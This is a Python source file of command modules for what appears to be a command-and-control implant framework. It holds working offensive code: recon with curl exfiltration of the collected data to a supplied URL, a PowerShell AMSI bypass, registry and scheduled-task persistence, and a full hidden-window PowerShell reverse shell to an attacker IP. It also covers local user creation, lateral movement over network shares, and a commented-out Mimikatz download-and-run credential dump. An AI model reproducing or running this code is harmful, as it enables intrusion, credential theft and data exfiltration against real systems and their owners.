from modules.agent_script_interpreter import BaseCommand
from modules.agent import BaseAgent
import time


######################################
# 1. Enhanced Ping Host with Automation
######################################
class EnhancedPingHost(BaseCommand):
    command_name = "ping_host"
    command_help = (
        "\tUsage: `ping_host` <host ip/hostname>\n"
        "\tPings a host and, if successful, gathers additional system info.\n"
        "\tChained recon commands (whoami, hostname) are enqueued if the host is alive."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if not args_list:
            raise ValueError("Usage: ping_host <host ip/hostname>")
        self.host = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        ping_cmd = f"shell ping {self.host}"
        ping_id = self.agent_class.enqueue_command(ping_cmd)
        time.sleep(1)
        ping_response = self.agent_class.get_one_command_and_response(ping_id).get(
            "response", ""
        )
        if "Reply from" in ping_response:
            print("Ping successful. Proceeding with additional recon.")
            for cmd in ["shell whoami", "shell hostname"]:
                self.agent_class.enqueue_command(cmd)
            ping_response += "\nHost is alive. Additional system info queued."
            self.agent_class.store_response(ping_id, ping_response)
        else:
            print("Ping failed or no response.")


######################################
# 2. System Recon (Multi-step)
######################################
class SystemRecon(BaseCommand):
    command_name = "system_recon"
    command_help = (
        "\tUsage: `system_recon` [exfiltration_url] [temp_filepath]\n"
        "\tAggregates system information and network connections.\n"
        "\tOptionally exfiltrates data if an exfiltration URL is provided (default temp file: C:\\temp\\sys_recon.txt)."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        self.exfil_url = args_list[0] if len(args_list) > 0 else None
        self.temp_filepath = (
            args_list[1] if len(args_list) > 1 else "C:\\temp\\sys_recon.txt"
        )
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        recon_data = ""
        cmds = [
            ("OS Version", "shell ver"),
            ("Current User", "shell whoami"),
            ("Hostname", "shell hostname"),
        ]
        for label, cmd in cmds:
            cmd_id = self.agent_class.enqueue_command(cmd)
            time.sleep(1)
            response = self.agent_class.get_one_command_and_response(cmd_id).get(
                "response", ""
            )
            recon_data += f"{label}:\n{response}\n\n"

        netstat_cmd = "start_process netstat -ano"
        netstat_id = self.agent_class.enqueue_command(netstat_cmd)
        time.sleep(2)
        netstat_resp = self.agent_class.get_one_command_and_response(netstat_id).get(
            "response", ""
        )
        recon_data += f"Netstat:\n{netstat_resp}\n\n"

        write_cmd = f"write_file {self.temp_filepath} {recon_data}"
        write_id = self.agent_class.enqueue_command(write_cmd)
        time.sleep(1)
        write_resp = self.agent_class.get_one_command_and_response(write_id).get(
            "response", ""
        )
        if "error" in write_resp.lower():
            print("Failed to write recon data:", write_resp)
        else:
            print("Recon data saved locally.")
            self.agent_class.store_response(write_id, write_resp)

        if self.exfil_url:
            exfil_cmd = f"shell curl -F 'file=@{self.temp_filepath}' {self.exfil_url}"
            exfil_id = self.agent_class.enqueue_command(exfil_cmd)
            time.sleep(2)
            exfil_resp = self.agent_class.get_one_command_and_response(exfil_id).get(
                "response", ""
            )
            if "error" in exfil_resp.lower():
                print("Exfiltration may have failed:", exfil_resp)
            else:
                print("Exfiltration successful.")
                self.agent_class.store_response(exfil_id, exfil_resp)


######################################
# 3. AMSI Bypass and PowerShell Execution
######################################
class AMSIBypassPS(BaseCommand):
    command_name = "amsi_bypass_ps"
    command_help = (
        "\tUsage: `amsi_bypass_ps` <powershell_command>\n"
        "\tBypasses AMSI and executes a PowerShell command.\n"
        "\tWARNING: Not OpSec Safe."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if not args_list:
            raise ValueError("Usage: amsi_bypass_ps <powershell_command>")
        self.ps_command = " ".join(args_list)
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            full_ps_cmd = (
                'powershell -Command "'
                "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                ".GetField('amsiInitFailed','NonPublic,Static')"
                ".SetValue($null,$true); "
                f'{self.ps_command}"'
            )
            bypass_cmd = f"shell {full_ps_cmd}"
            bypass_id = self.agent_class.enqueue_command(bypass_cmd)
            time.sleep(2)
            bypass_resp = self.agent_class.get_one_command_and_response(bypass_id).get(
                "response", ""
            )
            if "error" in bypass_resp.lower():
                print("AMSI bypass execution failed:", bypass_resp)
            else:
                print("AMSI bypass and PowerShell command executed successfully.")
                self.agent_class.store_response(bypass_id, bypass_resp)
        except Exception as e:
            print("AMSIBypassPS encountered an error:", e)


######################################
# 4. Registry-Based Persistence
######################################
class RegistryPersistence(BaseCommand):
    command_name = "registry_persistence"
    command_help = (
        "\tUsage: `registry_persistence <path_to_executable>`\n"
        "\tAdds a registry Run key for persistence.\n"
        "\tThe specified executable will run at logon."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 1:
            raise ValueError("Usage: registry_persistence <path_to_executable>")
        self.exe_path = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        reg_cmd = (
            f"shell reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            f'/v PersistApp /d "{self.exe_path}" /f'
        )
        reg_id = self.agent_class.enqueue_command(reg_cmd)
        time.sleep(1)
        reg_resp = self.agent_class.get_one_command_and_response(reg_id).get(
            "response", ""
        )
        if "error" in reg_resp.lower():
            print("Registry persistence failed:", reg_resp)
        else:
            print("Registry persistence established successfully.")
            self.agent_class.store_response(reg_id, reg_resp)


######################################
# 5. Scheduled Task Persistence
######################################
class ScheduledTaskPersistence(BaseCommand):
    command_name = "scheduled_task_persistence"
    command_help = (
        "\tUsage: `scheduled_task_persistence <filepath>`\n"
        "\tSchedules an .exe to run at logon via Windows schtasks.\n"
        "\tThe specified file will be executed at logon with high privileges."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 1:
            raise ValueError("Usage: scheduled_task_persistence <filepath>")
        self.exe_path = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            schedule_cmd = (
                f'shell schtasks /create /tn "PersistentTask" /tr "{self.exe_path}" '
                "/sc onlogon /rl highest"
            )
            schedule_id = self.agent_class.enqueue_command(schedule_cmd)
            time.sleep(1)
            schedule_resp = self.agent_class.get_one_command_and_response(
                schedule_id
            ).get("response", "")
            if "error" in schedule_resp.lower():
                raise Exception("Scheduling persistence task failed: " + schedule_resp)
            else:
                print("Scheduled task persistence established successfully.")
                self.agent_class.store_response(schedule_id, schedule_resp)
        except Exception as e:
            print("ScheduledTaskPersistence encountered an error:", e)


######################################
# 6. Reverse Shell (PowerShell)
######################################
class ReverseShell(BaseCommand):
    command_name = "reverse_shell"
    command_help = (
        "\tUsage: `reverse_shell <attacker_ip> <attacker_port>`\n"
        "\tLaunches a reverse shell using PowerShell.\n"
        "\tThe reverse shell is executed using `start_process` with hidden window mode."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 2:
            raise ValueError("Usage: reverse_shell <attacker_ip> <attacker_port>")
        self.attacker_ip = args_list[0]
        self.attacker_port = args_list[1]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            ps_payload = (
                f"$client = New-Object System.Net.Sockets.TCPClient('{self.attacker_ip}',{self.attacker_port});"
                "$stream = $client.GetStream();"
                "[byte[]]$bytes = 0..65535|%{0};"
                "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
                "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                "$sendback = (iex $data 2>&1 | Out-String );"
                "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                "$stream.Write($sendbyte,0,$sendbyte.Length);"
                "$stream.Flush()};"
                "$client.Close()"
            )
            rev_cmd = f'start_process powershell -nop -w hidden -c "{ps_payload}"'
            rev_id = self.agent_class.enqueue_command(rev_cmd)
            time.sleep(2)
            rev_resp = self.agent_class.get_one_command_and_response(rev_id).get(
                "response", ""
            )
            if "error" in rev_resp.lower():
                print("Reverse shell execution failed:", rev_resp)
            else:
                print("Reverse shell launched successfully.")
                self.agent_class.store_response(rev_id, rev_resp)
        except Exception as e:
            print("ReverseShell encountered an error:", e)


######################################
# 7. Kill Process
######################################
class KillProcess(BaseCommand):
    command_name = "kill_process"
    command_help = (
        "\tUsage: `kill_process <PID>`\n"
        "\tTerminates a process by its PID.\n"
        "\tUse with caution to avoid terminating critical processes."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 1:
            raise ValueError("Usage: kill_process <PID>")
        self.pid = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        kill_cmd = f"kill_process {self.pid}"
        kill_id = self.agent_class.enqueue_command(kill_cmd)
        time.sleep(1)
        kill_resp = self.agent_class.get_one_command_and_response(kill_id).get(
            "response", ""
        )
        if "error" in kill_resp.lower():
            print(f"Failed to kill process {self.pid}:", kill_resp)
        else:
            print(f"Process {self.pid} terminated successfully.")
            self.agent_class.store_response(kill_id, kill_resp)


######################################
# 8. Create User
######################################
class CreateUser(BaseCommand):
    command_name = "create_user"
    command_help = (
        "\tUsage: `create_user <username> <password>`\n"
        "\tCreates a new local user account.\n"
        "\tThe new account is added using the net user command."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 2:
            raise ValueError("Usage: create_user <username> <password>")
        self.username = args_list[0]
        self.password = args_list[1]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        create_cmd = f"shell net user {self.username} {self.password} /add"
        create_id = self.agent_class.enqueue_command(create_cmd)
        time.sleep(1)
        create_resp = self.agent_class.get_one_command_and_response(create_id).get(
            "response", ""
        )
        if "error" in create_resp.lower():
            print("User creation failed:", create_resp)
        else:
            print(f"User {self.username} created successfully.")
            self.agent_class.store_response(create_id, create_resp)


######################################
# 9. Lateral Movement
######################################
class LateralMovement(BaseCommand):
    command_name = "lateral_movement"
    command_help = (
        "\tUsage: `lateral_movement <drive_letter> <remote_share> <remote_exe_path>`\n"
        "\tMaps a network drive and executes a remote executable to pivot.\n"
        "\tExample: `lateral_movement Z \\\\192.168.1.100\\share pivot.exe`"
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 3:
            raise ValueError(
                "Usage: lateral_movement <drive_letter> <remote_share> <remote_exe_path>"
            )
        self.drive_letter = args_list[0]
        self.remote_share = args_list[1]
        self.remote_exe = args_list[2]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        map_cmd = f"shell net use {self.drive_letter}: {self.remote_share}"
        map_id = self.agent_class.enqueue_command(map_cmd)
        time.sleep(2)
        map_resp = self.agent_class.get_one_command_and_response(map_id).get(
            "response", ""
        )
        if "error" in map_resp.lower():
            print("Network drive mapping failed:", map_resp)
            return
        print("Network drive mapped successfully.")
        exec_cmd = f"start_process {self.drive_letter}:\\{self.remote_exe}"
        exec_id = self.agent_class.enqueue_command(exec_cmd)
        time.sleep(2)
        exec_resp = self.agent_class.get_one_command_and_response(exec_id).get(
            "response", ""
        )
        if "error" in exec_resp.lower():
            print("Remote execution failed:", exec_resp)
        else:
            print("Remote executable launched successfully.")
            self.agent_class.store_response(exec_id, exec_resp)


######################################
# 10. Credential Dumping (Mimikatz)
######################################
# The following module downloads mimikatz and then executes it.
# Uncomment and adjust if needed.
#
# class CredentialDump(BaseCommand):
#     command_name = "credential_dump"
#     command_help = (
#         "CredentialDump:\n"
#         "Usage: credential_dump <mimikatz_download_url> <mimikatz_script_filepath>\n"
#         "Downloads mimikatz and dumps credentials using mimikatz techniques.\n"
#         "Downloads mimikatz.exe from the specified URL and executes it with the provided script."
#     )
#
#     def __init__(self, command, args_list, agent_id):
#         super().__init__(command, args_list, agent_id)
#         if len(args_list) < 2:
#             raise ValueError("Usage: credential_dump <mimikatz_download_url> <mimikatz_script_filepath>")
#         self.download_url = args_list[0]
#         self.script_path = args_list[1]
#         self.agent_class = BaseAgent(agent_id)
#
#     def run(self):
#         download_cmd = f"http_get {self.download_url} mimikatz.exe"
#         download_id = self.agent_class.enqueue_command(download_cmd)
#         time.sleep(3)
#         download_resp = self.agent_class.get_one_command_and_response(download_id).get("response", "")
#         if "error" in download_resp.lower():
#             print("Mimikatz download failed:", download_resp)
#             return
#         else:
#             print("Mimikatz downloaded successfully.")
#
#         mimikatz_cmd = f"start_process mimikatz.exe"
#         mimikatz_id = self.agent_class.enqueue_command(mimikatz_cmd)
#         time.sleep(3)
#         mimikatz_resp = self.agent_class.get_one_command_and_response(mimikatz_id).get("response", "")
#         if "error" in mimikatz_resp.lower():
#             print("Credential dumping failed:", mimikatz_resp)
#         else:
#             print("Credential dumping executed. Check stored output for credentials.")
#             self.agent_class.store_response(mimikatz_id, mimikatz_resp)
